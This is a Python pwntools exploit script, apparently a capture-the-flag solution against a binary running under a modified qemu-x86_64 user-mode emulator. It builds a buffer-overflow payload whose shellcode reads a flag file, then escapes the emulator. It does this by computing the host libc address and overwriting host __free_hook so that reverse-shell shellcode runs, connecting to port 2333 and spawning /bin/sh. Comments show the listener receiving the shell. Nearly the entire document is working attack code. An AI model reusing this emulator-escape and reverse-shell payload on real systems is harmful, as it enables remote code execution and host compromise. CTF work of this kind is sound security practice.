#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./app', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(libc.search(asm(x, os='linux', arch=code.arch)))

def exploit(r):
    sc = shellcraft.amd64.linux
    code.address = 0x4000000000
    libc.address = 0x4000c53000
    rev = asm(
        sc.connect('127.0.0.1', 2333)
        +sc.execve("/bin/sh")
    )
    # nc -lvp 2333
    # Listening on [0.0.0.0] (family 0, port 2333)
    # Connection from [127.0.0.1] port 2333 [tcp/*] accepted (family 2, sport 57110)
    # sh >&0
    # 
    rop = flat(
        'A'*40,
        0x4000a01f00,
        '\x90'*0x100,
        asm(
            sc.open("flag")
            +sc.read("rax", "rsp", 0x100)
            +sc.write(1, "rsp", 0x100)
            +sc.close(0)
            +sc.mmap(0x4000000000,0x200000,7,constants.MAP_PRIVATE|constants.MAP_ANONYMOUS, -1, 0)
            +'mov rbx, rax;'
            +'mov rsp, rax;'
            +'add rsp, 0x1000;'
            +shellcraft.amd64.pushstr(rev,append_null=False)
            +'mov rsi, rsp;' # rsi=shellcode
            +'add rbx, 0x260a000;' # rbx=guest_libc
            +'mov rcx, [rbx+0x3c4028];' # realloc
            +'sub rcx, 0x1f7f6;' # rcx=host_libc
            +'mov rdx, rcx;'
            +'sub rdx, rbx;' # rdx=guest_base
            +'mov rdi, rcx;'
            +'add rdi, 3958696;'
            +'sub rdi, rdx;' # rdi=host_libc.__free_hook - guest_base
            +'add rsi, rdx;' # rsi=shellcode + guest_base
            +'mov [rdi], rsi;'
            +'mov rax, 31338;'
            +'syscall'
        ),
        '\x90'*0x100,
    )
    write('rop', rop)
    raw_input('#')
    r.sendlineafter(': ', rop)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    elif len(sys.argv) > 1:
        #r = remote('127.0.0.1', 4444)
        r = process(['./qemu-x86_64', '-g', '4444', '-B', '0x123000', './app'])
        #r = process(['./qemu-x86_64', '-B', '0x123000', './app'])
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    else:
        #r = remote('127.0.0.1', 4444)
        #r = process(['./qemu-x86_64', '-strace', './app.bak'])
        r = process('./run.sh app', shell=True)
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    print code, libc
    exploit(r)
